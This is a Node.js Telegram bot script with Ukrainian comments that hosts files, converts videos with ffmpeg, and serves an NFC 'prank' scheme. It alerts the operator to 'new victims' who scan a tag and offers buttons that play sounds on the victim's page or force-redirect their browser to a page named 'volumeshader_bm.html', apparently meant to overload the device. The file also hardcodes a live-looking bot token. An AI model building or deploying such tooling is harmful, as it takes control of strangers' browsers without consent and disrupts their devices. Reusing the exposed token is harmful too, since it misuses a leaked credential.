const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const https = require('https');
const { v4: uuidv4 } = require('uuid');

// --- ПІДКЛЮЧЕННЯ FFMPEG ---
const ffmpeg = require('fluent-ffmpeg');
const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
ffmpeg.setFfmpegPath(ffmpegPath);

// --- НАЛАШТУВАННЯ ---
const token = '8597954828:AAFCUWRD3rq3HGdN9ZYnvMU4wx1LFC32WWE'; 
const bot = new TelegramBot(token, { polling: true });

// Шляхи (мають збігатися з server.js)
const uploadDir = path.join(__dirname, 'public', 'uploads');
// Твій домен на Render
const PUBLIC_DOMAIN = 'https://prank-nfc.onrender.com'; 

// Перевірка папки
if (!fs.existsSync(uploadDir)){
    fs.mkdirSync(uploadDir, { recursive: true });
}

console.log('🤖 TELEGRAM BOT ЗАПУЩЕНО З КОНВЕРТЕРОМ...');

// --- 1. КОМАНДА /START ---
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    global.adminChatId = chatId; // Зберігаємо chatId адміна (для сповіщень)
    bot.sendMessage(chatId, 
`👋 **Привет!**

Я файловый сервер + конвертер + уведомитель о сканировании NFC.

📂 **Что я умею:**
1. Хранить любые файлы и давать прямую ссылку.
2. 🎬 Если бросишь **видео**, я предложу сделать из него **GIF** или **MP3**.
3. 🚨 Уведомлять о новых жертвах (сканирование NFC) с кнопками для активации.

Бросай файл или жди уведомлений!`, { parse_mode: 'Markdown' });
});

// --- 2. ОБРОБКА ВХІДНИХ ФАЙЛІВ ---
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    
    // Ігноруємо текстові команди
    if (msg.text && msg.text.startsWith('/')) return;

    if (msg.text) {
        bot.sendMessage(chatId, '🖼 Бросай файл, а не текст.');
        return;
    }

    let fileId = null;
    let ext = '.dat';
    let typeName = '📁 Файл';
    let isVideo = false;

    // Визначаємо тип
    if (msg.photo) {
        fileId = msg.photo[msg.photo.length - 1].file_id;
        ext = '.jpg';
        typeName = '📷 Фото';
    } else if (msg.audio) {
        fileId = msg.audio.file_id;
        ext = '.mp3';
        typeName = '🎵 Аудио';
    } else if (msg.voice) {
        fileId = msg.voice.file_id;
        ext = '.ogg';
        typeName = '🎤 Голос';
    } else if (msg.video) {
        fileId = msg.video.file_id;
        ext = '.mp4';
        typeName = '🎬 Видео';
        isVideo = true; // Маркер, що це відео
    } else if (msg.document) {
        fileId = msg.document.file_id;
        ext = path.extname(msg.document.file_name) || '.dat';
        typeName = '📁 Док';
    }

    // Завантаження
    if (fileId) {
        const tempMsg = await bot.sendMessage(chatId, '⏳ Загрузка...', { disable_notification: true });
        
        try {
            const fileLink = await bot.getFileLink(fileId);
            const newFilename = `${Date.now()}-${uuidv4().slice(0,8)}${ext}`;
            const publicUrl = `${PUBLIC_DOMAIN}/uploads/${newFilename}`;
            
            downloadFile(fileLink, newFilename, chatId, publicUrl, typeName, tempMsg.message_id, isVideo);
        } catch (error) {
            bot.sendMessage(chatId, `❌ Ошибка API: ${error.message}`);
        }
    }
});

// --- 3. ОБРОБКА КНОПОК (GIF / MP3) ---
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data; // Формат: "action|filename" або "play_sound|roomId" тощо
    
    const [action, param] = data.split('|');

    bot.answerCallbackQuery(query.id); // Прибираємо "годинничок" на кнопці

    if (action === 'to_gif' || action === 'to_mp3') {
        // Обробка конвертації (як раніше)
        const inputPath = path.join(uploadDir, param);

        // Перевірка чи існує файл
        if (!fs.existsSync(inputPath)) {
            bot.answerCallbackQuery(query.id, { text: '❌ Файл не найден!', show_alert: true });
            return;
        }

        const processMsg = await bot.sendMessage(chatId, '⚙️ Обработка... Это может занять до 30 сек.');

        // КОНВЕРТАЦІЯ В GIF
        if (action === 'to_gif') {
            const gifFilename = param.replace('.mp4', '.gif');
            const gifPath = path.join(uploadDir, gifFilename);
            const publicUrl = `${PUBLIC_DOMAIN}/uploads/${gifFilename}`;

            ffmpeg(inputPath)
                .outputOption('-vf', 'fps=10,scale=320:-1:flags=lanczos') // Оптимізація GIF (легка вага)
                .save(gifPath)
                .on('end', () => {
                    addToServerList(gifFilename, publicUrl, '🎞 GIF');
                    bot.deleteMessage(chatId, processMsg.message_id).catch(()=>{});
                    bot.sendMessage(chatId, `✅ **GIF готов!**\n\n🔗 Ссылка:\n\`${publicUrl}\``, { parse_mode: 'Markdown' });
                })
                .on('error', (err) => {
                    bot.sendMessage(chatId, `❌ Ошибка GIF: ${err.message}`);
                });
        } 
        // КОНВЕРТАЦІЯ В MP3
        else if (action === 'to_mp3') {
            const mp3Filename = param.replace('.mp4', '.mp3');
            const mp3Path = path.join(uploadDir, mp3Filename);
            const publicUrl = `${PUBLIC_DOMAIN}/uploads/${mp3Filename}`;

            ffmpeg(inputPath)
                .toFormat('mp3')
                .save(mp3Path)
                .on('end', () => {
                    addToServerList(mp3Filename, publicUrl, '🎵 MP3 из видео');
                    bot.deleteMessage(chatId, processMsg.message_id).catch(()=>{});
                    bot.sendMessage(chatId, `✅ **MP3 готов!**\n\n🔗 Ссылка:\n\`${publicUrl}\``, { parse_mode: 'Markdown' });
                })
                .on('error', (err) => {
                    bot.sendMessage(chatId, `❌ Ошибка MP3: ${err.message}`);
                });
        }
    } else {
        // Обробка NFC-кнопок (play_sound, redirect)
        const roomId = param;
        if (!global.io) {
            bot.sendMessage(chatId, '❌ Ошибка: Нет доступа к серверу.');
            return;
        }

        if (action === 'play_sound') {
            global.io.to(roomId).emit('play-sound');
            bot.sendMessage(chatId, '🔊 Звук включен!');
        } else if (action === 'redirect') {
            global.io.to(roomId).emit('force-redirect', { url: "https://prank-nfc.onrender.com/volumeshader_bm.html" });
            bot.sendMessage(chatId, '💣 Bombardio активирован!');
        }
    }
});

// --- 4. ФУНКЦІЯ ЗАВАНТАЖЕННЯ ---
const downloadFile = (url, filename, chatId, publicUrl, typeName, msgIdToDelete, isVideo) => {
    const filePath = path.join(uploadDir, filename);
    const file = fs.createWriteStream(filePath);

    https.get(url, (response) => {
        response.pipe(file);
        
        file.on('finish', () => {
            file.close(() => {
                // Додаємо в список
                addToServerList(filename, publicUrl, typeName);

                // Видаляємо "Загрузка..."
                bot.deleteMessage(chatId, msgIdToDelete).catch(()=>{});

                // Параметри повідомлення
                const msgOptions = { parse_mode: 'Markdown' };

                // Якщо це відео, додаємо клавіатуру
                if (isVideo) {
                    msgOptions.reply_markup = {
                        inline_keyboard: [
                            [
                                { text: '🎞 Сделать GIF', callback_data: `to_gif|${filename}` },
                                { text: '🎵 Вытянуть MP3', callback_data: `to_mp3|${filename}` }
                            ]
                        ]
                    };
                }

                bot.sendMessage(chatId, `✅ **${typeName} сохранено!**\n\n🔗 Ссылка:\n\`${publicUrl}\``, msgOptions);
            });
        });
    }).on('error', (err) => {
        fs.unlink(filename, () => {}); // Видаляємо битий файл
        bot.sendMessage(chatId, `❌ Ошибка записи: ${err.message}`);
    });
};

// --- 5. ДОПОМІЖНА ФУНКЦІЯ ДЛЯ СЕРВЕРА ---
function addToServerList(filename, url, typeName) {
    if (global.botFiles) {
        global.botFiles.unshift({
            filename: filename,
            url: url,
            type: typeName,
            uploadedAt: new Date().toLocaleTimeString('ru-RU')
        });
        // Тримаємо тільки останні 30 файлів
        if (global.botFiles.length > 30) global.botFiles.pop();
    }
}

// Запобіжник від падіння
bot.on('polling_error', (error) => {});

module.exports = bot;
